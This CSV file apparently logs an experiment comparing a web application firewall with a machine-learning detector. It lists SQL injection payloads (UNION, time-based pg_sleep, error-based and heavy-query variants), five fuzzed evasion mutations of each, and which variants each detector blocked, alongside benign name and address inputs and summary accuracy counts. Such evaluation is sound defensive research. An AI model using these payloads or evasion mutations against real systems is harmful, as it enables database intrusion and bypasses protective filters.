Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
26,2024-12-16T19:30:02.249330,7964,200,200,200,both_correct,0x538 like/**/ AND 1,2024-12-16T19:30:02.587803,200,200,both_correct,0x538	LiKE/*~P*/ AnD/**/0x1,2024-12-16T19:30:04.653858,200,200,both_correct,"0x538	liKe/**/
AnD 0x1",2024-12-16T19:30:07.037314,200,200,both_correct,"0x538
liKe/**/
aND/**/0x1",2024-12-16T19:30:09.209709,200,200,both_correct,"0x538
LIke/**/
and
0x1",2024-12-16T19:30:11.467634,200,200,both_correct
27,2024-12-16T19:30:13.615874,"1'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'ujjr'  =  'ujjr",403,403,200,waf_correct_ml_incorrect,"8421 LIKE 8421'   )    )     )   or char  (  (SELECT 68)  )  ||char  (  69  )  ||char  (  97  )
 ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (   AND 1  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     ( /**/'ujjr'  =  'ujjr",2024-12-16T19:30:24.253960,403,403,both_correct,"8421 lIke 8421'   )    )     )   or char  (  (SELECT 0x44)  )  ||char  (  69  )  ||char  (  97  )	 ||char  (  8306 IN (8305,8306,8307)  )    =  regexp_substring  (  repeat  (  right  (  char  (   AND  AND 1  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     ( /**/'ujjr'/**/ =  'ujjr",2024-12-16T19:30:37.379598,403,403,both_correct,"8421 likE 8421'   )    )     )   or char  (  (SELECT 0x44)  )  ||char  (  69  )/**/ ||char  (  0x61  )	 ||char  (  8306 IN (3392=3392,8306, AND 1)  )    =  regexp_substring  (  repeat  (  right  (  char  (   AND  AND 1  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     ( /**/'ujjr'/**/ =
 'ujjr",2024-12-16T19:30:52.137575,403,403,both_correct,"8421 lIKe 8421'   )    )     )   or char  (  (SELECT 0x44)  )  ||char  (  69  )/*-$0x1+*/ ||char  (  0x61  )	 ||char  (   AND 1 IN (3392=3392,8306, AND 1)  )    =  regexp_substring  (  repeat  (  right  (  char  (   AND  AND 9547<>9548  )  ,0  )  ,5000000000/**/ )  ,null  )   and    (    (     ( /**/'ujjr'/**/ =  'ujjr",2024-12-16T19:31:07.274771,403,403,both_correct,"8421 lIkE (SeLecT 8421)'   )    )     )   or char  (  (SELECT 0x44)  )  ||char  (  '&' NOT LIKE '&f'  )/*-$0x1+*/ ||char  (  0x61  )
 ||char  (   AND 1 IN (3392=3392, OR 0, AND 1)  )    =  regexp_substring  (  repeat  (  right  (  char  (   AND  AND 9547<>9548  )  ,0  )  ,5000000000/**/ )  ,null  )   and    (    (     ( /*AIP*g*/'ujjr'  =  'ujjr",2024-12-16T19:31:23.599556,403,403,both_correct
28,2024-12-16T19:31:41.497610,foguear,200,200,200,both_correct,foguear,2024-12-16T19:31:42.015509,200,200,both_correct,foguear,2024-12-16T19:31:43.529274,200,200,both_correct,foguear,2024-12-16T19:31:45.021774,200,200,both_correct,foguear,2024-12-16T19:31:46.480196,200,200,both_correct,foguear,2024-12-16T19:31:47.960937,200,200,both_correct
29,2024-12-16T19:31:49.435766,"1' where 5004  =  5004 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",403,403,200,waf_correct_ml_incorrect,"1' WherE (SeleCt 0x1)  =  3145<>3146 oR 7552   Like     (  seLeCT count  (  *  )/**/  froM rdb$fields as t1,rdb$types aS t2,rdb$collations aS t3,rdb$functions as	t4  )  --",2024-12-16T19:31:56.492453,200,200,both_incorrect,"'g' LiKE 'g'' WHEre (sELeCt 0x1)  =   or 0!=3146 oR 0x1d80
  Like     (  selecT count  (  *  )   fRom rdb$fields AS t1,rdb$types As t2,rdb$collations AS t3,rdb$functions aS	t4  )  --",2024-12-16T19:32:05.590029,200,200,both_incorrect,"'g' lIkE 'g'' WHEre (sELeCt 0x1)  =   or (SELECT  OR 0)!='""K'6' NOT LIKE '""K'6f' or 0x1d80
  lIKE     (  select count  (  *  )  /**/froM rdb$fields As t1,rdb$types As t2,rdb$collations as t3,rdb$functions AS t4  )  --",2024-12-16T19:32:15.359195,200,200,both_incorrect,"'g' LiKe 'g'' WHEre (sELeCt 0x1)  =   or (SELECT  OR '/q' NOT LIKE '/qg')!='""K'(SELECT  OR 0)' NOT LIKE '""K'6f' or 0x1d80
  LIKE/**/    (  SELeCt count  (  *  )  /**/frOm rdb$fields aS
t1,rdb$types AS t2,rdb$collations aS t3,rdb$functions aS t4  )  --",2024-12-16T19:32:26.621812,200,200,both_incorrect,"(SELECT 1)' WHEre (sELeCt 0x1)  =   or (SELECT  OR '/q' NOT LIKE '/qg')!='""K'(SELECT  OR 'R<.g'<>'R<.g$')' NOT LIKE '""K'6f' oR 0x1d80
  LiKe/**/    (  SELEct count  (  *  )  /*|*/fRoM rdb$fields aS t1,rdb$types AS t2,rdb$collations as t3,rdb$functions AS t4  )/**/ --",2024-12-16T19:32:39.825605,403,403,both_correct
30,2024-12-16T19:32:53.564678,"-3775'  )   as rqet where 7092  =  7092 or elt  (  1032  =  1032,3623  )  --",403,403,200,waf_correct_ml_incorrect,"-3775'  )  
as rqet whERe 7092  /**/like   7092 Or elt  (  0x408  =  'y@s>)' NOT LIKE 'y@s>)I', AND 1  )  --",2024-12-16T19:32:57.234265,403,200,waf_correct_ml_incorrect,"-(SELECT 3775)'  )  	as rqet whERe 7092   like   ';Cy' LIKE ';Cy' Or elt  (  0x408  =  'y@s>)' NOT LIKE 'y@s>)I', And  and 1  )  --",2024-12-16T19:33:03.645724,403,403,both_correct,"-(SeLEcT (seLeCt 3775))'  )   as rqet whERe 'a' NOT LIKE 'ax'   like   ';Cy' LIKE ';Cy' Or elt  (  0x408  =  'y@s>)' NOT LIKE 'y@s>)I',/*L3ehZ*/aNd  and  ANd 1  )  --",2024-12-16T19:33:10.817044,403,403,both_correct,"-(selEct (SelEcT (Select '''=''')))'  )   as rqet whERe 'a' NOT LIKE 'ax'   like   ';Cy'/**/LIKE ';Cy' Or elt  (  0x408  = 	'y@s>)' NOT LIKE 'y@s>)I',/*L3ehZ*/AnD  and  and  OR 0  )  --",2024-12-16T19:33:19.572736,403,403,both_correct,"-(seleCT (selECt (SELEcT '''=''')))'  )   as rqet whERe 'a' NOT LIKE 'ax'   like   ';Cy'/*ON*/LIKE ';Cy' Or elt  (  0x408  = 	'y@s>)' NOT	LIKE 'y@s>)I', anD  And  aNd  ||  anD 0x1  )  --",2024-12-16T19:33:29.722158,403,200,waf_correct_ml_incorrect
31,2024-12-16T19:33:39.509110,feutlins,200,200,200,both_correct,feutlins,2024-12-16T19:33:40.029171,200,200,both_correct,feutlins,2024-12-16T19:33:41.521276,200,200,both_correct,feutlins,2024-12-16T19:33:43.026032,200,200,both_correct,feutlins,2024-12-16T19:33:44.534921,200,200,both_correct,feutlins,2024-12-16T19:33:46.056625,200,200,both_correct
32,2024-12-16T19:33:47.556135,maribeth4,200,200,200,both_correct,maribeth4,2024-12-16T19:33:48.107760,200,200,both_correct,maribeth4,2024-12-16T19:33:49.634533,200,200,both_correct,maribeth4,2024-12-16T19:33:51.188254,200,200,both_correct,maribeth4,2024-12-16T19:33:52.762191,200,200,both_correct,maribeth4,2024-12-16T19:33:54.301803,200,200,both_correct
33,2024-12-16T19:33:55.863769,acedera,200,200,200,both_correct,acedera,2024-12-16T19:33:56.328118,200,200,both_correct,acedera,2024-12-16T19:33:57.764701,200,200,both_correct,acedera,2024-12-16T19:33:59.240052,200,200,both_correct,acedera,2024-12-16T19:34:00.693282,200,200,both_correct,acedera,2024-12-16T19:34:02.148389,200,200,both_correct
34,2024-12-16T19:34:03.619653,"c/ mineria, 151 13?g",200,200,200,both_correct,"c/ mineria,/**/151 (SeLEct	5606 NOT LIKE 0x15e7)?g",2024-12-16T19:34:04.717292,200,200,both_correct,"c//**/mineria,/**/8384= or 0 (SElecT (SelECT 5606) NOT LIKE 0x15e7)?g",2024-12-16T19:34:08.169138,200,403,waf_correct_ml_incorrect,"c//**/mineria,/**/(SELECT 1) LIKE  Or '$' NOT/**/LIKE '$#' (SeLECt
(SElEct 0x15e6) NOT LIKE 0x15e7)?g\E",2024-12-16T19:34:12.804839,403,403,both_incorrect,"c//*{n*/mineria, (seLeCT  && 0x1) LIKe  or '$' NOT/**/lIKe
'$#' (SeLeCT
(SEleCt 0x15e6) NOT LIKE 0x15e7)?g\E",2024-12-16T19:34:18.757570,403,200,waf_incorrect_ml_correct,"c//*U*/mineria, (sElect  && 0x1) like  OR/**/'$' NOT/**/lIkE	'$#' (seLect
(SelECT 0x15e6) NOT LIKE 0x15e7)?g\E",2024-12-16T19:34:24.829012,403,200,waf_incorrect_ml_correct
35,2024-12-16T19:34:31.087092,77711232m,200,200,200,both_correct,77711232m,2024-12-16T19:34:31.637655,200,200,both_correct,77711232m,2024-12-16T19:34:33.164274,200,200,both_correct,77711232m,2024-12-16T19:34:34.750454,200,200,both_correct,77711232m,2024-12-16T19:34:36.298904,200,200,both_correct,77711232m,2024-12-16T19:34:37.881151,200,200,both_correct
36,2024-12-16T19:34:39.416767,-7187' or 4159  =  7465,403,403,200,waf_correct_ml_incorrect,"-(SELECT 1)' Or/**/0x103f  =  3645
lIkE 3645",2024-12-16T19:34:40.601533,403,403,both_correct,-(SelEcT 0x1)' or 0x103f  =  3645	liKe  oR 'G'='G',2024-12-16T19:34:44.064396,403,200,waf_correct_ml_incorrect,"-(seLECT/**/0x1)' or 0x103f  =   OR 0x561=1377
liKe  oR 'G'='G'",2024-12-16T19:34:47.540572,403,200,waf_correct_ml_incorrect,"-(sELecT 0x1)' or 0x103f 
=   OR 0x561=(SELECT  AND 1)=5424
liKe  oR 'G'='G'",2024-12-16T19:34:51.567422,403,403,both_correct,"-(SeLeCt 0x1)' or 0x103f 
=/**/  OR 0x561=(SELECT  AND '%<E' LIKE '%<E')=(SELECT  AND 1)	liKe  oR 'G'='G'",2024-12-16T19:34:56.176158,403,403,both_correct
37,2024-12-16T19:35:02.293146,"-9929'  )   as gbtc where 8162  =  8162 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",403,403,200,waf_correct_ml_incorrect,"-9929'  )   as gbtc where 0x1fe2  =  8162 or (SELECT 1) group by concat  ( /*I*/0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 'Q'
LIKE 'Q' eLse 0 eND   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having MiN  (  0  )  #",2024-12-16T19:35:13.540308,403,200,waf_correct_ml_incorrect,"-9929'  )   as gbtc where 0x1fe2  =  8162 or (SELECT 1) group by concat  ( /**/0x7171706a71, 
(  select   (  case when   (  4232  =  4232  )   then 'Q'
LIKE 'Q' ELsE  OR 0 end   )    ) /**/ ,0x717a767a71,floor  (  rand  (  '.K'<>'.Ko'  )  *2   )    )    having mIN  (  (SELECT 0)  )  #E",2024-12-16T19:35:26.706298,403,403,both_correct,"- ANd 1'  )   as gbtc where 0x1fe2  =  8162 or (SELECT 1) group by concat  ( /**/0x7171706a71, 
(  select   (  case when   (  4232  =  'y'<>'yC'  )   then 'Q'	LIKE 'Q' ELsE  OR 0 end   )    ) /*TZ*/ ,0x717a767a71,floor  (  rand  (  '.K'<>'.Ko'  )  *2   )    )    having/**/miN  (  (seLect 0x0)  )  #E",2024-12-16T19:35:41.463479,403,200,waf_correct_ml_incorrect,"- aND 1'  )   as gbtc where 0x1fe2  =  8162 or (SELECT (SELECT 1)) group by concat  ( /**/0x7171706a71, 	(  select   (  case when   (   AND 1275 IN (1274,1275,1276)  =  'y'<>'yC'  )   then 'Q'	LIKE 'Q' ELsE  OR 0 end   )    ) /*TZ*/ ,0x717a767a71,floor  (  rand  (  '.K'<>'.Ko'  )  *2   )    )    having/*>x%*/min /**/(  (SElect 0x0)  )  #E",2024-12-16T19:35:56.594608,403,403,both_correct,"- AND 1'  )   as gbtc where 0x1fe2  =  (SELECT 1) or (SELECT (SELECT 1)) group by concat  ( /**/0x7171706a71,  (  select   (  case when   (   AND 0x4fb IN (1274,'W'!='Ww',1276)  =  'y'<>'yC'  )   then 'Q'	LIKE 'Q' ELsE  OR 0 end   )    ) /*TZ*/ ,0x717a767a71,floor  (  rand  (  '.K'<>'.Ko'  )  *2   )    )    having/*>x%*/MIn  (  (SeLECt 0x0)  )  #ET~",2024-12-16T19:36:13.914243,403,403,both_correct
38,2024-12-16T19:36:31.581954,masahiro,200,200,200,both_correct,masahiro,2024-12-16T19:36:32.094848,200,200,both_correct,masahiro,2024-12-16T19:36:33.612017,200,200,both_correct,masahiro,2024-12-16T19:36:35.126678,200,200,both_correct,masahiro,2024-12-16T19:36:36.619907,200,200,both_correct,masahiro,2024-12-16T19:36:38.134048,200,200,both_correct
39,2024-12-16T19:36:39.643408,"1'  )   where 3703  =  3703 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",403,403,403,both_correct,"0x1'  )   WHERE 3703  =  (selEct '5' NOT LIKE '5I') anD 2716   LIKE     (  selEcT/**/count  (  *  )
  from sysusers aS sys1,sysusers AS sys2,sysusers aS sys3,sysusers as sys4,sysusers AS sys5,sysusers As sys6,sysusers AS sys7  )  --",2024-12-16T19:36:49.095262,403,403,both_correct,"0x1'  )   WHERE  OR 0  =  (selEct '5' NOT LIKE '5I') anD '0x2}'='2}'   LiKE     (  SeLECT count  (  *  )	  fRom sysusers As sys1,sysusers aS sys2,sysusers As sys3,sysusers as sys4,sysusers AS sys5,sysusers aS sys6,sysusers As sys7  )  --",2024-12-16T19:37:01.280169,200,403,waf_incorrect_ml_correct,"0x1'  )   WHERE  OR 0x0  =  (selEct ' aND 1782!=1783' NOT LIKE '5I') anD '0x2}'='2}'   lIke     ( 	selEcT count  (  *  )	 /*@*/fRom sysusers as sys1,sysusers As sys2,sysusers aS sys3,sysusers aS sys4,sysusers AS sys5,sysusers as sys6,sysusers As sys7  )  --",2024-12-16T19:37:13.384980,200,403,waf_incorrect_ml_correct,"0x1'  )   WHERE  OR	0x0  =  (selEct ' anD 1782 NOT LIKE 1783' NOT LIKE '5I') anD '0x2}'=' AND 1 IN (5075,(SELECT 5076),5077)}'   LIkE     (/**/	seLeCt count  (  *  )	 /*@*/FROm sysusers AS sys1,sysusers aS sys2,sysusers aS sys3,sysusers AS sys4,sysusers AS sys5,sysusers as sys6,sysusers As sys7  )  --",2024-12-16T19:37:26.650331,200,403,waf_incorrect_ml_correct,"0x1'  )   WHERE  OR	0x0  =  (selEct ' AND 1782 not like 1783' NOT LIKE
'5I') anD '0x2}'=' aND (select 1) iN (5075,(SelecT 1926!=0x787),5077)}'   lIKe /**/   (/**/	SelEct count  (  *  )	 /**/froM sysusers as sys1,sysusers aS sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers AS sys7  )  --",2024-12-16T19:37:42.356709,200,403,waf_incorrect_ml_correct
40,2024-12-16T19:37:58.263716,3.786E+15,200,200,200,both_correct,(SELECT	 and 1).786E+'2B_' LIKE/**/'2B_',2024-12-16T19:37:58.848162,403,403,both_incorrect,"(SeLect
 and  && '94n'!='0x94nX').786E+'2B_' like '2B_'",2024-12-16T19:38:01.823270,403,200,waf_incorrect_ml_correct,(SelECT	/*mb1*/ANd   and  ''l:' LIKE 'l:'4n'!='0x94nX').786E+'2B_' LikE '2B_',2024-12-16T19:38:05.617284,403,200,waf_incorrect_ml_correct,(seleCt /**/ANd/**/  ANd  ''l:' LIKE 'l:'4n'<>'0x94nX').786E+'2B_' LIKE '2B_',2024-12-16T19:38:10.702961,403,403,both_incorrect,(SeLeCt /**/aNd   AnD	 ''l:' LIKE 'l:'4n' NOT LIKE '0x94nX').786E+'2B_' lIke '2B_',2024-12-16T19:38:15.471146,403,403,both_incorrect
41,2024-12-16T19:38:20.473086,1 or pg_sleep  (  __TIME__  )  --,403,403,200,waf_correct_ml_incorrect,"'=' not like '=I' or pg_sleep 
(  __TIME__  )/*V>'b*/ --",2024-12-16T19:38:22.162610,403,200,waf_correct_ml_incorrect,'=' not like '=I' oR pg_sleep  (  __TIME__  )  --,2024-12-16T19:38:25.943209,403,200,waf_correct_ml_incorrect,"'=' not like '=I' oR pg_sleep
/**/(  __TIME__  )  --",2024-12-16T19:38:29.374755,403,200,waf_correct_ml_incorrect,'='/**/not like '=I' Or pg_sleep	/**/(  __TIME__  )  --,2024-12-16T19:38:32.939335,403,200,waf_correct_ml_incorrect,'=' not like '=I' oR pg_sleep /**/(  __TIME__  )  --,2024-12-16T19:38:36.582721,403,200,waf_correct_ml_incorrect
42,2024-12-16T19:38:40.388131,erny1,200,200,200,both_correct,erny1,2024-12-16T19:38:40.757555,200,200,both_correct,erny1,2024-12-16T19:38:42.119075,200,200,both_correct,erny1,2024-12-16T19:38:43.479978,200,200,both_correct,erny1,2024-12-16T19:38:44.850547,200,200,both_correct,erny1,2024-12-16T19:38:46.241511,200,200,both_correct
43,2024-12-16T19:38:47.596221,06327548h,200,200,200,both_correct,06327548h,2024-12-16T19:38:48.164807,200,200,both_correct,06327548h,2024-12-16T19:38:49.707987,200,200,both_correct,06327548h,2024-12-16T19:38:51.261530,200,200,both_correct,06327548h,2024-12-16T19:38:52.835951,200,200,both_correct,06327548h,2024-12-16T19:38:54.378335,200,200,both_correct
44,2024-12-16T19:38:55.943682,elbeze,200,200,200,both_correct,elbeze,2024-12-16T19:38:56.372027,200,200,both_correct,elbeze,2024-12-16T19:38:57.782698,200,200,both_correct,elbeze,2024-12-16T19:38:59.178418,200,200,both_correct,elbeze,2024-12-16T19:39:00.595175,200,200,both_correct,elbeze,2024-12-16T19:39:02.023188,200,200,both_correct
45,2024-12-16T19:39:03.441903,"-1844""   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  ""abdw"" like ""abdw",403,403,200,waf_correct_ml_incorrect,"-')'!=')^'""   )    )     )   or	make_set  (  0x248a  =   OR 0,7185  )   and    (/*_F*/   (     (  ""abdw"" like ""abdw",2024-12-16T19:39:08.314151,403,200,waf_correct_ml_incorrect,"-')' not like ')^'""   )    )     )   or make_set  (  0x248a  =  /**/OR 0x0, OR 'Q'!='Q7'  )   and    (/*>*/   (     (  ""abdw"" like ""abdw",2024-12-16T19:39:14.770777,403,200,waf_correct_ml_incorrect,"-')' not like ')^'""   )    ) 	   )   or make_set  (  0x248a  =   OR 0x0, OR 'Q'!='Q7'  )   and    (/**/   (     (  ""abdw"" like ""abdw",2024-12-16T19:39:22.653320,403,200,waf_correct_ml_incorrect,"-')' not like ')^'""   )/**/   ) 
   )   or make_set  (  0x248a  =   OR 0x0, OR 'Q'!='Q7'  )   and    (/*?*/   (     (  ""abdw"" like ""abdw",2024-12-16T19:39:30.124714,403,200,waf_correct_ml_incorrect,"-')' not like ')^'""   )    )     )   or make_set  (  0x248a  =   OR 0x0, OR 'Q'!='Q7'  )   and    (/**/   (     (  ""abdw"" like ""abdw",2024-12-16T19:39:37.552760,403,200,waf_correct_ml_incorrect
46,2024-12-16T19:39:44.832154,aldea del cano,200,200,200,both_correct,"aldea
del/**/cano",2024-12-16T19:39:45.813294,403,200,waf_incorrect_ml_correct,aldea	del cano,2024-12-16T19:39:47.821389,200,200,both_correct,"aldea	del
cano",2024-12-16T19:39:49.595484,200,200,both_correct,aldea	del cano,2024-12-16T19:39:51.402688,200,200,both_correct,aldea del/**/cano,2024-12-16T19:39:53.159931,200,200,both_correct
47,2024-12-16T19:39:55.064502,nedra,200,200,200,both_correct,nedra,2024-12-16T19:39:55.446274,200,200,both_correct,nedra,2024-12-16T19:39:56.794036,200,200,both_correct,nedra,2024-12-16T19:39:58.151139,200,200,both_correct,nedra,2024-12-16T19:39:59.504936,200,200,both_correct,nedra,2024-12-16T19:40:00.884117,200,200,both_correct
48,2024-12-16T19:40:02.244557,!,403,200,403,waf_incorrect_ml_correct,!,2024-12-16T19:40:02.417213,200,403,waf_incorrect_ml_correct,!,2024-12-16T19:40:03.582508,200,403,waf_incorrect_ml_correct,!,2024-12-16T19:40:04.758325,200,403,waf_incorrect_ml_correct,!,2024-12-16T19:40:05.940005,200,403,waf_incorrect_ml_correct,!,2024-12-16T19:40:07.115696,200,403,waf_incorrect_ml_correct
49,2024-12-16T19:40:08.291400,"calle arenys de mar, 113,",200,200,200,both_correct,"calle/*V	Q[)*/arenys de	mar,  anD '_|'!='_|_',",2024-12-16T19:40:09.596820,200,200,both_correct,"calle/*V Q[)*/arenys de	mar,/**/ AnD '_|'<>'_|_',",2024-12-16T19:40:12.856097,200,200,both_correct,"calle/*V Q[)*/arenys/*4foS*/de mar,/**/ And '_|' NOT LIKE '_|_',",2024-12-16T19:40:16.289094,200,200,both_correct,"calle/*V Q[)*/arenys/*#oMb*/de mar,/**/
And/**/'_|' not like '_|_',",2024-12-16T19:40:20.497622,200,200,both_correct,"calle/*V	Q[)*/arenys/**/de mar, 
and/**/'_|' not like '_|_',",2024-12-16T19:40:24.824864,200,200,both_correct
50,2024-12-16T19:40:28.707507,"-1963 union all select 6831,6831,6831,6831,6831,6831,6831,6831#",403,403,403,both_correct,"-'m' NOT LIKE 'mU' union	all seLECT 6831,6831,0x1aaf,6831,(SELECT/**/1),6831,6831,6831#,@",2024-12-16T19:40:32.042702,403,403,both_correct,"-'m' not like 'mU' union
all/**/SeLEcT 6831,(sEleCT 6831),0x1aaf, AnD 1,(SELEcT/**/1),6831,6513=6513,6831#,@ ",2024-12-16T19:40:37.226122,403,403,both_correct,"-'m' not/**/like 'mU' union
all/**/sElect 6831,(sElECt 6831),0x1aaf, AND 1,(SelEct/*5qR'L*/1), oR 0,6513='W' Like 'W',(SELECt
6831)#,@ ",2024-12-16T19:40:43.492832,403,200,waf_correct_ml_incorrect,"-'m' not like 'mU' union
all/**/sELECt 6831,(SeLecT 6831),0x1aaf, ANd 1,(SelECT/**/1),
or (SELECT 0),(SELECT 'S'!='SR') LIKE 'W' lIkE 'W',(SElecT
6831)#,@ +",2024-12-16T19:40:50.779825,403,403,both_correct,"-'m' not like 'mU' union
all/**/seleCT (selEcT 1),(SelEct 0x1aaf),0x1aaf, ANd 1,(seLect/**/1),
Or (selECt 'e('<>'e(T'),(sElect/**/'S' NOT LIKE 'SR') like 'W' LiKe 'W',(SeLeCT 6831)#,@ +",2024-12-16T19:40:59.639825,403,200,waf_correct_ml_incorrect

Overall Results
WAF TP,115
WAF TN,140
WAF FP,28
WAF FN,17
ML TP,67
ML TN,149
ML FP,19
ML FN,65

Combined Results (2x2 Matrix)
,WAF Correct,WAF Incorrect
ML Correct,189,27
ML Incorrect,66,18
